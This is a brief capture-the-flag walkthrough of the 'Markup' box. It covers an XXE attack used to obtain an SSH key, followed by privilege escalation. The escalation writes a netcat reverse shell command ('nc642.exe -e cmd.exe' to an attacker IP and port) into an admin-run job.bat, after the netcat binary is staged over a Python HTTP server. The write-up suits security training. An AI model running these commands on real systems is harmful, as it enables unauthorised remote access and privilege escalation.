This box started with using XXE - XML External Entity exploit to find the SSH key of the daniel user we found through inspecting the webstite html. We then take advantage of a bat file we have fun control over that runs periodically as admin to create a reverse shell. The shell was created by using a python http server on our attacker machine so we could get the exe from our target machine.   



wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe - to get a compatible netcat executable 

python3 -m http.server 443 - to host the webserver to get the nc exe to the windows box

wget http://10.10.15.172:443/ncWindows.exe -outfile nc642.exe - to get the netcat executable 


daniel@MARKUP C:\Log-Management>`echo C:\Log-Management\nc642.exe -e cmd.exe 10.10.15.172 9001 > C:\Log-Management\job.bat`  - this echo command was used to write to the job.bat file